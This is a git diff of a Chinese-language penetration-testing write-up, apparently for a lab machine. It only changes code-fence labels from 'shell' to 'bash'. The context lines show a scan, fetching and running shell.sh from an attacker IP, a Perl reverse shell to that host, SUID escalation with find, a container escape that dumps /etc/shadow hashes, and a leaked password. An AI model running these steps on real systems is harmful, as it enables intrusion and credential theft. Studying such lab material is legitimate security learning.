@@ -2,7 +2,7 @@
 
 ## 信息搜集
 
-```shell title="sudo ./tools/fscan-1.8.4/fscan -h 192.168.200.134"
+```bash title="sudo ./tools/fscan-1.8.4/fscan -h 192.168.200.134"
 start infoscan
 192.168.200.134:80 open
 192.168.200.134:22 open
@@ -116,7 +116,7 @@ command=full-import&verbose=false&clean=false&commit=false&debug=true&core=demo&
 
 尝试实现反连
 
-```shell
+```bash
 wget 192.168.200.128/shell.sh
 chmod +x shell.sh
 sh ./shell.sh
@@ -124,7 +124,7 @@ sh ./shell.sh
 
 成功收到反弹 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ nc -lvnp 9999
 listening on [any] 9999 ...
@@ -135,7 +135,7 @@ root
 
 或者也可以高级一点，直接用 `pwncat` 处理反连 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ pwncat-cs -lp 9999
 [08:45:06] Welcome to pwncat 🐈!
@@ -159,7 +159,7 @@ password:Ax2Xwz1@x*Xs1I
 
 上传两个工具 `CDK` 和 `linpeas` 运行，得到自动化检测结果
 
-```shell title="linpeas"
+```bash title="linpeas"
                                    ╔═══════════╗
 ═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                    ╚═══════════╝
@@ -266,11 +266,11 @@ SCM=Subversion&client=`id`
 
 确认可以命令执行，尝试反弹 shell
 
-```shell title="shell.sh"
+```bash title="shell.sh"
 perl -e 'use Socket;$i="192.168.200.128";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [13:21:31] Welcome to pwncat 🐈!
@@ -285,7 +285,7 @@ www-data
 
 尝试搜寻 suid 特权文件
 
-```shell title="find / -perm -u=s -type f 2>/dev/null"
+```bash title="find / -perm -u=s -type f 2>/dev/null"
 /bin/su
 /bin/mount
 /bin/umount
@@ -300,7 +300,7 @@ www-data
 
 尝试利用 `find` 实现提权到 root
 
-```shell
+```bash
 (remote) www-data@873c2ec0dbeb:/tmp$ find . -exec /bin/bash -p \; -quit
 (remote) root@873c2ec0dbeb:/tmp$ whoami
 root
@@ -308,7 +308,7 @@ root
 
 搜集信息
 
-```shell title="linpeass"
+```bash title="linpeass"
                               ╔═════════════════════╗
 ══════════════════════════════╣ Network Information ╠══════════════════════════════
                               ╚═════════════════════╝
@@ -326,7 +326,7 @@ nameserver 192.168.200.2
 search localdomain
 ```
 
-```shell title="cdk"
+```bash title="cdk"
 (remote) root@873c2ec0dbeb:/tmp# ./cdk_linux_amd64 auto-escape ls
 2025/03/15 13:57:45 Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`.
 
@@ -368,7 +368,7 @@ open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or direct
 
 根据输出，尝试使用 `cap-dac-read-search`
 
-```shell title="./cdk_linux_amd64 run cap-dac-read-search"
+```bash title="./cdk_linux_amd64 run cap-dac-read-search"
 (remote) root@873c2ec0dbeb:/tmp# ./cdk_linux_amd64 run cap-dac-read-search
 Running with target: /etc/shadow, ref: /etc/hostname
 root:$6$yI61A01eNCul1WWm$qNFS.GCNGvnPNf09b2iZArHiXW5jB9d/Z4bh5hXBFotzQmcmUw6rVjJ6dxJZLU8y9EystxPsuKlld2Grk8Gc2/:20151:0:99999:7:::
@@ -424,7 +424,7 @@ sshd:*:20151:0:99999:7:::
 
 结合 `CAP_DAC_READ_SEARCH` 权限被启用，尝试进行分析
 
-```shell
+```bash
 (remote) root@873c2ec0dbeb:/tmp# ./cdk_linux_amd64 run cap-dac-read-search
 Running with target: /etc/shadow, ref: /etc/hostname
 root:$6$yI61A01eNCul1WWm$qNFS.GCNGvnPNf09b2iZArHiXW5jB9d/Z4bh5hXBFotzQmcmUw6rVjJ6dxJZLU8y9EystxPsuKlld2Grk8Gc2/:20151:0:99999:7:::
@@ -434,7 +434,7 @@ qwe:$6$PHFUFXpCzu7EsuT9$vTXRl66ngDfaki6e2S2MCeO5J2YpDsO6AeubOshT.Hdvrf49lRsVhyej
 
 同时发现
 
-```shell
+```bash
 (remote) root@873c2ec0dbeb:/data/etc# cat /data/etc/shadow
 root:$6$yI61A01eNCul1WWm$qNFS.GCNGvnPNf09b2iZArHiXW5jB9d/Z4bh5hXBFotzQmcmUw6rVjJ6dxJZLU8y9EystxPsuKlld2Grk8Gc2/:20151:0:99999:7:::
 qwe:$6$PHFUFXpCzu7EsuT9$vTXRl66ngDfaki6e2S2MCeO5J2YpDsO6AeubOshT.Hdvrf49lRsVhyejaPMDmDhUFdezeX1cIH5cQATtHY0p9.:20151:0:99999:7:::
@@ -442,7 +442,7 @@ qwe:$6$PHFUFXpCzu7EsuT9$vTXRl66ngDfaki6e2S2MCeO5J2YpDsO6AeubOshT.Hdvrf49lRsVhyej
 
 很明显，直接将宿主机的 `/` 挂载到容器的 `/data` 目录了
 
-```shell title="/data/home/qwe/.bash_history"
+```bash title="/data/home/qwe/.bash_history"
 docker image rm vulhub/weblogic
 docker image rm e0958635a01f
 docker ps -a
@@ -465,7 +465,7 @@ docker run -d -v /:/data -p 80:80 -e MYSQL_INTERNAL=true --privileged=true 41101
 
 那就不用多说了，都是特权容器
 
-```shell
+```bash
 # 未提权
 (remote) www-data@873c2ec0dbeb:/$ whoami; hostname
 www-data
